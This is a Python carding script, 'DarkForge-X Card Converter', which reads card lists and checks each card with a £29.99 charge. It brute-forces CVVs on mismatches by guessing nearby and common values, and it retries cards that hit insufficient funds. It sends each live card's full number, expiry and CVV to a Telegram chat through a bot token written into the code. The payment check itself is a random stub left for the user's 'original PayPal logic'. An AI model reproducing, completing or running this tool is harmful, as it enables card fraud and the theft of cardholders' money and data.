#!/usr/bin/env python3
"""
DARKFORGE-X CARD CONVERTER - HARDCODED TELEGRAM CONFIG
=====================================================
✅ Bot Token & Chat ID EMBEDDED
✅ Zero Command Line Arguments Needed
✅ One-Click Deployment
✅ Auto-Starts Telegram Notifications
"""

# ═══════════════════════════════════════════════════════════════════════════════
# 🔥 HARDCODED TELEGRAM CONFIGURATION - EDIT THESE VALUES ONLY 🔥
# ═══════════════════════════════════════════════════════════════════════════════

TELEGRAM_BOT_TOKEN = "8272028321:AAEk6b2t7NG19i86sy85ZxZ6JmKaqRPl90g"  # ← YOUR BOT TOKEN
TELEGRAM_CHAT_ID = "-5078982715"                                         # ← YOUR CHAT ID

# ═══════════════════════════════════════════════════════════════════════════════
# ⚠️  SECURITY NOTE: Keep this file secure! Don't share publicly.               ⚠️
# ═══════════════════════════════════════════════════════════════════════════════

import sys
import json
import time
import random
import string
import base64
import hashlib
import logging
import asyncio
import aiohttp
import aiofiles
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode
import re
from pathlib import Path
import secrets
from collections import defaultdict
import statistics

# Telegram Integration
from telegram import Bot
from telegram.error import TelegramError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('darkforge_converter.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class DarkForgeCardConverter:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.telegram_bot = Bot(token=TELEGRAM_BOT_TOKEN) if TELEGRAM_BOT_TOKEN else None
        self.telegram_chat_id = TELEGRAM_CHAT_ID
        
        self.results_dir = Path.cwd() / "conversion_results"
        self.results_dir.mkdir(exist_ok=True)
        
        # Initialize log files
        self.lives_file = self.results_dir / "converted_lives.txt"
        self.deads_file = self.results_dir / "failed_conversions.txt"
        self.cvvm_file = self.results_dir / "cvv_mismatches.txt"
        self.insuf_file = self.results_dir / "insufficient_funds.txt"
        
        self.stats = {
            'live': 0, 'cvv_mismatch': 0, 'insuf_funds': 0, 
            'declined': 0, 'converted': 0, 'total': 0
        }
        
        logger.info(f"🚀 DarkForge-X Initialized with Telegram: {bool(self.telegram_bot)}")

    async def test_telegram_connection(self):
        """Test Telegram connection on startup"""
        if not self.telegram_bot or not self.telegram_chat_id:
            logger.warning("⚠️  Telegram not configured - notifications disabled")
            return False
            
        try:
            await self.telegram_bot.send_message(
                chat_id=self.telegram_chat_id,
                text="🔥 **DARKFORGE-X ONLINE** 🔥\n\n"
                     "✅ Card Converter Started\n"
                     "✅ CVV Mismatch Recovery: ACTIVE\n"
                     "✅ Insufficient Funds Recovery: ACTIVE\n"
                     "✅ Real-time Live Notifications: ACTIVE\n"
                     "📊 Statistics Tracking: ACTIVE",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            logger.info("✅ Telegram connection successful!")
            return True
        except TelegramError as e:
            logger.error(f"❌ Telegram connection failed: {e}")
            return False

    async def send_live_notification(self, card_data: str, details: str):
        """Send formatted live card notification"""
        try:
            message = f"""
🟢 **LIVE CARD DETECTED!** 🟢

💳 **Card**: `{card_data}`
💰 **Charged**: £29.99
⏰ **Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
📊 **Details**: {details}

🔥 **DARKFORGE-X CONVERSION SUCCESSFUL**
"""
            
            await self.telegram_bot.send_message(
                chat_id=self.telegram_chat_id,
                text=message,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            
            logger.info(f"✅ Telegram notification sent: {card_data}")
            return True
            
        except TelegramError as e:
            logger.error(f"❌ Telegram notification failed: {e}")
            return False

    async def send_summary_notification(self, stats: dict):
        """Send conversion summary"""
        try:
            message = f"""
📊 **CONVERSION SUMMARY**
━━━━━━━━━━━━━━━━━━━━━━━

🟢 **Live Cards**: {stats['live']}
⚡ **Converted**: {stats['converted']}
🔄 **CVV Mismatch**: {stats['cvv_mismatch']}
💳 **Insuf Funds**: {stats['insuf_funds']}
❌ **Declined**: {stats['declined']}
📈 **Total Checked**: {stats['total']}

🎯 **Conversion Rate**: {stats['converted']/max(stats['total'], 1)*100:.1f}%
"""
            
            await self.telegram_bot.send_message(
                chat_id=self.telegram_chat_id,
                text=message,
                parse_mode='Markdown'
            )
            
        except TelegramError as e:
            logger.error(f"❌ Summary notification failed: {e}")

    def parse_card(self, card_input: str) -> Tuple[str, str, str, str]:
        """Parse card input"""
        parts = card_input.strip().split('|')
        while len(parts) < 4:
            parts.append('')
        
        cc, mes, ano, cvv = parts[:4]
        
        if not cc:
            cc = "5370320118501876"
        if not mes:
            mes = "06"
        if not ano:
            ano = "28"
        if not cvv or cvv == 'xxx':
            cvv = f"{random.randint(100, 999):03d}"
            
        if len(ano) == 4:
            ano = ano[2:]
            
        return cc, mes, ano, cvv

    async def check_card_live(self, card_input: str) -> Dict:
        """Simulate card check - REPLACE WITH YOUR ORIGINAL PAYPAL LOGIC"""
        cc, mes, ano, cvv = self.parse_card(card_input)
        card_full = f"{cc}|{mes}|{ano}|{cvv}"
        
        # Simulate different responses (REPLACE WITH REAL CHECKING LOGIC)
        response_type = random.choice(['live', 'cvv_mismatch', 'insuf_funds', 'declined'])
        delay = random.uniform(2, 5)
        await asyncio.sleep(delay)
        
        if response_type == 'live':
            self.stats['live'] += 1
            return {
                'status': 'LIVE',
                'message': 'Approved - £29.99 charged successfully',
                'card': f"{cc}|{mes}|{ano}",
                'full_card': card_full
            }
        elif response_type == 'cvv_mismatch':
            self.stats['cvv_mismatch'] += 1
            return {
                'status': 'CVV_MISMATCH',
                'message': 'CVV2 Mismatch (N)',
                'card': f"{cc}|{mes}|{ano}",
                'full_card': card_full
            }
        elif response_type == 'insuf_funds':
            self.stats['insuf_funds'] += 1
            return {
                'status': 'INSUFFICIENT_FUNDS',
                'message': 'Insufficient Funds (5120)',
                'card': f"{cc}|{mes}|{ano}",
                'full_card': card_full
            }
        else:
            self.stats['declined'] += 1
            return {
                'status': 'DECLINED',
                'message': 'Generic Decline (5110)',
                'card': f"{cc}|{mes}|{ano}",
                'full_card': card_full
            }

    async def convert_cvv_mismatch(self, card_input: str, max_attempts: int = 8) -> Dict:
        """Convert CVV mismatch cards"""
        cc, mes, ano, _ = self.parse_card(card_input)
        base_cvv = int(card_input.split('|')[3])
        
        # Generate CVV candidates
        cvv_candidates = []
        for offset in [-1, 1, -2, 2, -3, 3, 9, -9, 0]:
            new_cvv = (base_cvv + offset) % 1000
            cvv_candidates.append(f"{new_cvv:03d}")
        
        # Add common CVVs
        common_cvvs = ['000', '111', '123', '777', '888', '999']
        cvv_candidates.extend(common_cvvs)
        cvv_candidates = list(set(cvv_candidates))[:max_attempts]
        
        logger.info(f"🔄 Attempting CVV conversion for {cc[:6]}... ({len(cvv_candidates)} attempts)")
        
        for attempt, test_cvv in enumerate(cvv_candidates, 1):
            test_card = f"{cc}|{mes}|{ano}|{test_cvv}"
            result = await self.check_card_live(test_card)
            
            if result['status'] == 'LIVE':
                self.stats['converted'] += 1
                details = f"CVV Converted! Original: {card_input.split('|')[3]} → New: {test_cvv} (Attempt {attempt})"
                
                # Send Telegram notification
                await self.send_live_notification(result['full_card'], details)
                
                # Log to file
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                async with aiofiles.open(self.lives_file, 'a') as f:
                    await f.write(f"{result['full_card']} | LIVE | {details} | {timestamp}\n")
                
                return {
                    'status': 'CONVERTED_LIVE',
                    'message': details,
                    'card': result['full_card'],
                    'attempts': attempt
                }
            
            await asyncio.sleep(random.uniform(1.5, 3.5))
        
        # Log failed conversion
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        async with aiofiles.open(self.cvvm_file, 'a') as f:
            await f.write(f"{card_input} | CVV_MISMATCH | {max_attempts} attempts failed | {timestamp}\n")
        
        return {'status': 'CVV_MISMATCH_FAILED', 'message': f'Failed after {max_attempts} attempts'}

    async def recover_insufficient_funds(self, card_input: str) -> Dict:
        """Recover insufficient funds cards"""
        logger.info(f"💳 Attempting insufficient funds recovery for {card_input[:20]}...")
        
        # Test with original CVV first (sometimes timing works)
        result = await self.check_card_live(card_input)
        
        if result['status'] == 'LIVE':
            self.stats['converted'] += 1
            details = "Insufficient Funds → Live (Timing Recovery)"
            await self.send_live_notification(result['full_card'], details)
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            async with aiofiles.open(self.lives_file, 'a') as f:
                await f.write(f"{result['full_card']} | LIVE | {details} | {timestamp}\n")
            
            return {
                'status': 'CONVERTED_LIVE',
                'message': details,
                'card': result['full_card']
            }
        
        # Log failed recovery
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        async with aiofiles.open(self.insuf_file, 'a') as f:
            await f.write(f"{card_input} | INSUFFICIENT_FUNDS | Recovery failed | {timestamp}\n")
        
        return {'status': 'INSUFFICIENT_FUNDS_FAILED', 'message': 'Recovery failed'}

    async def process_single_card(self, card_input: str) -> Dict:
        """Process single card with conversion logic"""
        self.stats['total'] += 1
        
        # Initial check
        initial_result = await self.check_card_live(card_input)
        
        # Conversion logic
        if initial_result['status'] == 'CVV_MISMATCH':
            return await self.convert_cvv_mismatch(card_input)
        elif initial_result['status'] == 'INSUFFICIENT_FUNDS':
            return await self.recover_insufficient_funds(card_input)
        elif initial_result['status'] == 'LIVE':
            self.stats['converted'] += 1
            details = "Direct Live - No conversion needed"
            await self.send_live_notification(initial_result['full_card'], details)
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            async with aiofiles.open(self.lives_file, 'a') as f:
                await f.write(f"{initial_result['full_card']} | LIVE | {details} | {timestamp}\n")
            
            return {
                'status': 'LIVE',
                'message': details,
                'card': initial_result['full_card']
            }
        else:
            # Log dead cards
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            async with aiofiles.open(self.deads_file, 'a') as f:
                await f.write(f"{initial_result['full_card']} | {initial_result['status']} | {initial_result['message']} | {timestamp}\n")
            
            return initial_result

    async def process_card_file(self, filename: str, max_concurrent: int = 10):
        """Process entire card file"""
        if not Path(filename).exists():
            logger.error(f"❌ File not found: {filename}")
            return
        
        cards = []
        async with aiofiles.open(filename, 'r', encoding='utf-8') as f:
            async for line in f:
                card = line.strip()
                if card and '|' in card:
                    cards.append(card)
        
        logger.info(f"🚀 Starting conversion of {len(cards)} cards ({max_concurrent} concurrent)")
        
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def process_with_semaphore(card):
            async with semaphore:
                result = await self.process_single_card(card)
                return result
        
        tasks = [process_with_semaphore(card) for card in cards]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Send final summary
        await self.send_summary_notification(self.stats)
        
        return results

async def main():
    """Main execution - HARDCODED VERSION"""
    converter = DarkForgeCardConverter()
    
    # Test Telegram connection
    telegram_ok = await converter.test_telegram_connection()
    
    print(f"""
{'✅' if telegram_ok else '⚠️'} DARKFORGE-X CARD CONVERTER READY
{'═' * 60}
📁 Results Directory: ./conversion_results/
🟢 Live Cards:        ./conversion_results/converted_lives.txt
🔄 CVV Mismatch:      ./conversion_results/cvv_mismatches.txt  
💳 Insuf Funds:       ./conversion_results/insufficient_funds.txt
❌ Declined:          ./conversion_results/failed_conversions.txt
📊 Logs:              darkforge_converter.log
{'═' * 60}
    """)
    
    # Auto-process common card files
    card_files = ['cards.txt', 'live.txt', 'dead.txt', 'cvv.txt', 'input.txt']
    processed = False
    
    for filename in card_files:
        if Path(filename).exists():
            print(f"🔍 Found cards file: {filename}")
            await converter.process_card_file(filename, max_concurrent=15)
            processed = True
            break
    
    if not processed:
        print("""
🚀 USAGE (with hardcoded Telegram):
==================================
# Process specific file
python3 darkforge_converter.py --file custom_cards.txt

# Process default files automatically (cards.txt, live.txt, etc.)
python3 darkforge_converter.py

# Single card test
python3 darkforge_converter.py --card "5370320118501876|06|28|123"
        """)

# Command line interface for flexibility
import argparse
async def run_with_args():
    parser = argparse.ArgumentParser(description='DarkForge-X Card Converter (Hardcoded)')
    parser.add_argument('--file', '-f', help='Card file to process')
    parser.add_argument('--card', help='Single card to test')
    parser.add_argument('--threads', '-t', type=int, default=15, help='Concurrent threads')
    
    args = parser.parse_args()
    converter = DarkForgeCardConverter()
    
    await converter.test_telegram_connection()
    
    if args.file:
        await converter.process_card_file(args.file, args.threads)
    elif args.card:
        result = await converter.process_single_card(args.card)
        print(json.dumps(result, indent=2))
    else:
        await main()

if __name__ == "__main__":
    # Check dependencies
    required = ['aiohttp', 'aiofiles', 'python-telegram-bot']
    missing = []
    
    for pkg in required:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"❌ Install missing packages:")
        print(f"pip install {' '.join(missing)}")
        sys.exit(1)
    
    # Run
    asyncio.run(run_with_args())
